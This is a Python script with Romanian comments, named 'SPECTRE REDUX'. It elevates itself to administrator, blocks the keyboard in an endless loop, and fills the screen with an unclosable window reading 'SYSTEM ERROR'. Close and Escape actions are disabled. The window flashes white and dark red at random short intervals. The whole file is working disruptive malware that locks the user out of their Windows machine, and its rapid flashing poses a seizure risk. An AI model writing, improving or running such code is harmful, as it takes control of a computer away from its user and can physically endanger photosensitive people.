#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SPECTRE REDUX - Versiune REPARATĂ
Ecran roșu fullscreen + blițuri + blocare tastatură
Rulează ca ADMINISTRATOR
"""

import tkinter as tk
import threading
import time
import sys
import ctypes
import os
import random

# ============================================
# AUTO ADMIN RESTART
# ============================================

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    script = os.path.abspath(sys.argv[0])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, None, 1)
    sys.exit()

if not is_admin():
    run_as_admin()

# ============================================
# BLOCK KEYBOARD (mai simplu și mai stabil)
# ============================================

def block_keyboard_forever():
    """Blochează tastatura la infinit"""
    while True:
        try:
            # Metoda principală - BlockInput
            ctypes.windll.user32.BlockInput(True)
            
            # Metoda secundară - hook pentru taste
            try:
                import keyboard
                keyboard.block_key('all')
            except:
                pass
                
            time.sleep(0.1)
        except:
            pass

# ============================================
# RED FLASH SCREEN (REPARAT)
# ============================================

class RedFlashScreen:
    def __init__(self):
        self.root = tk.Tk()
        self.w = self.root.winfo_screenwidth()
        self.h = self.root.winfo_screenheight()
        
        # Configurare fereastră - fullscreen absolut
        self.root.configure(background="red")
        self.root.overrideredirect(True)
        self.root.geometry(f"{self.w}x{self.h}+0+0")
        self.root.attributes("-topmost", True)
        self.root.attributes("-fullscreen", True)
        self.root.focus_force()
        self.root.grab_set()
        
        # Prevenim închiderea cu ESC sau orice altceva
        self.root.bind("<Key>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Text principal
        self.label1 = tk.Label(self.root, 
                              text="⚠️ SYSTEM ERROR ⚠️", 
                              font=("Segoe UI", 56, "bold"),
                              fg="white", bg="red")
        self.label1.pack(expand=True)
        
        # Pornim blițurile
        self.flashing = True
        self.flash()
        
    def flash(self):
        """Face blițuri la infinit"""
        if self.flashing:
            # Alege random alb sau roșu intens
            if random.choice([True, False]):
                # Bliț alb
                self.root.configure(background="white")
                self.label1.config(bg="white", fg="red")
                self.root.after(50, self.reset_color)
            else:
                # Bliț roșu intens
                self.root.configure(background="#8B0000")
                self.root.after(50, self.reset_color)
            
            # Programează următorul bliț (între 0.2 și 1.5 secunde)
            next_flash = random.uniform(0.2, 1.5)
            self.root.after(int(next_flash * 1000), self.flash)
    
    def reset_color(self):
        """Revine la roșu normal"""
        self.root.configure(background="red")
        self.label1.config(bg="red", fg="white")
    
    def run(self):
        """Pornește main loop-ul tkinter"""
        self.root.mainloop()

# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    # Pornim blocarea tastaturii în thread
    keyboard_thread = threading.Thread(target=block_keyboard_forever, daemon=True)
    keyboard_thread.start()
    
    # Pornim ecranul roșu (ASTA TREBUIE SĂ RULEZE PE THREADUL PRINCIPAL)
    red = RedFlashScreen()
    red.run()